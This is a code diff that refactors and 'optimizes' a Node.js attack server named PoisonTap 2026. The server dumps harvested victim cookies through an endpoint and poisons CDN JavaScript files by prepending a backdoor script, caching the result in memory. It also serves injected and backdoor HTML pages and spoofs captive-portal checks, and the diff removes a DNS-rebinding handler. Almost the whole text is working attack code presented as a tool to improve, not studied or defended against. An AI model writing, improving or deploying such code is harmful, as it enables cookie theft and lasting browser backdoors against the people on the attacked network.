@@ -1,16 +1,29 @@
-// PoisonTap 2026 | Core HTTP/DNS/CDN Server
+// PoisonTap 2026 | Optimized Core HTTP/DNS/CDN Server
 const http = require('http');
 const fs = require('fs');
+const fsPromises = fs.promises;
 const path = require('path');
-const dns = require('node:dns');
 
 const PORT = 1337;
-const INJECTED_HTML = fs.readFileSync(path.join(__dirname, 'target_injected_xhtmljs_2026.html'), 'utf8');
-const BACKDOOR_HTML = fs.readFileSync(path.join(__dirname, 'backdoor_2026.html'), 'utf8');
 const COOKIE_LOG = path.join(__dirname, 'cookies.json');
 const CDN_DIR = path.join(__dirname, 'js');
 const REBIND_ZONES = {};
 const REBIND_LOCKS = new Map();
+const ASSET_CACHE = new Map();
+
+let INJECTED_HTML, BACKDOOR_HTML, TARGET_BACKDOOR;
+
+async function init() {
+  try {
+    INJECTED_HTML = await fsPromises.readFile(path.join(__dirname, 'target_injected_xhtmljs_2026.html'), 'utf8');
+    BACKDOOR_HTML = await fsPromises.readFile(path.join(__dirname, 'backdoor_2026.html'), 'utf8');
+    TARGET_BACKDOOR = await fsPromises.readFile(path.join(__dirname, 'target_backdoor_2026.js'), 'utf8');
+    console.log('[+] Assets loaded into memory');
+  } catch (err) {
+    console.error('[-] Failed to load assets:', err);
+    process.exit(1);
+  }
+}
 
 // Safe CDN injection wrapper
 function safeInject(content, prepend) {
@@ -20,21 +33,7 @@ function safeInject(content, prepend) {
   return `${prepend}\n${sep}${content}`;
 }
 
-// DNS Rebinding Handler
-function getDNSResponse(query) {
-  const match = query.match(/^(\d+\.\d+\.\d+\.\d+)\.pin\.ip\.samy\.pl$/i);
-  if (match) {
-    const ip = match[1];
-    const lock = REBIND_LOCKS.get(ip);
-    if (lock && Date.now() < lock.expiry) {
-      REBIND_ZONES[`${ip}.ip.samy.pl`] = lock.target;
-      REBIND_LOCKS.delete(ip);
-    }
-  }
-  return REBIND_ZONES[query] || '1.0.0.1';
-}
-
-const server = http.createServer((req, res) => {
+const server = http.createServer(async (req, res) => {
   const url = new URL(req.url, `http://${req.headers.host}`);
   const headers = {
     'Content-Type': req.headers.host === '1.0.0.1' ? 'text/html' : 'application/javascript',
@@ -45,7 +44,7 @@ const server = http.createServer((req, res) => {
     'Cross-Origin-Opener-Policy': 'same-origin'
   };
 
-  // Captive Portal Bypass (iOS/Android 14+)
+  // Captive Portal Bypass
   if (url.pathname === '/hotspot-detect.html' || url.pathname === '/generate_204') {
     headers['Content-Type'] = 'application/octet-stream';
     res.writeHead(200, headers);
@@ -55,10 +54,15 @@ const server = http.createServer((req, res) => {
 
   // Cookie Dump
   if (url.pathname === '/PoisonCookieDump') {
-    headers['Content-Type'] = 'application/json';
-    res.writeHead(200, headers);
-    res.end(fs.readFileSync(COOKIE_LOG, 'utf8') || '{}');
-    fs.writeFileSync(COOKIE_LOG, '{}', 'utf8'); // Auto-rotate
+    try {
+      const data = await fsPromises.readFile(COOKIE_LOG, 'utf8');
+      headers['Content-Type'] = 'application/json';
+      res.writeHead(200, headers);
+      res.end(data || '{}');
+      await fsPromises.writeFile(COOKIE_LOG, '{}', 'utf8');
+    } catch (e) {
+      res.writeHead(500); res.end('Error');
+    }
     return;
   }
 
@@ -72,35 +76,46 @@ const server = http.createServer((req, res) => {
     return;
   }
 
-  // CDN Cache Poisoning
-  const cdnFile = path.join(CDN_DIR, path.basename(url.pathname.replace(/\//g, '_')));
-  if (fs.existsSync(cdnFile)) {
-    try {
-      const content = fs.readFileSync(cdnFile, 'utf8');
-      const backdoor = fs.readFileSync(path.join(__dirname, 'target_backdoor_2026.js'), 'utf8');
+  // CDN Cache Poisoning (with Memory Cache)
+  if (url.pathname.startsWith('/js/')) {
+    const fileName = path.basename(url.pathname.replace(/\//g, '_'));
+    if (ASSET_CACHE.has(fileName)) {
       headers['Content-Type'] = 'application/javascript';
       res.writeHead(200, headers);
-      res.end(safeInject(content, backdoor));
+      res.end(ASSET_CACHE.get(fileName));
       return;
+    }
+
+    const cdnFile = path.join(CDN_DIR, fileName);
+    try {
+      if (fs.existsSync(cdnFile)) {
+        const content = await fsPromises.readFile(cdnFile, 'utf8');
+        const poisoned = safeInject(content, TARGET_BACKDOOR);
+        ASSET_CACHE.set(fileName, poisoned);
+        headers['Content-Type'] = 'application/javascript';
+        res.writeHead(200, headers);
+        res.end(poisoned);
+        return;
+      }
     } catch (e) {}
   }
 
   // Backdoor Injection
   if (url.pathname.includes('/PoisonTap')) {
-    res.writeHead(200, headers);
+    res.writeHead(200, { ...headers, 'Content-Type': 'text/html' });
     res.end(BACKDOOR_HTML);
     return;
   }
 
-  // Default: Injected HTML/JS-agnostic payload
-  headers['Content-Type'] = 'text/html';
-  res.writeHead(200, headers);
+  // Default: Injected HTML
+  res.writeHead(200, { ...headers, 'Content-Type': 'text/html' });
   res.end(INJECTED_HTML);
 });
 
-server.listen(PORT, '0.0.0.0', () => {
-  console.log(`[+] PoisonTap 2026 listening on :${PORT}`);
-  console.log(`[+] DNS rebinding active on port ${PORT}`);
+init().then(() => {
+  server.listen(PORT, '0.0.0.0', () => {
+    console.log(`[+] Optimized PoisonTap 2026 listening on :${PORT}`);
+  });
 });
 
 process.on('SIGTERM', () => { server.close(); process.exit(0); });
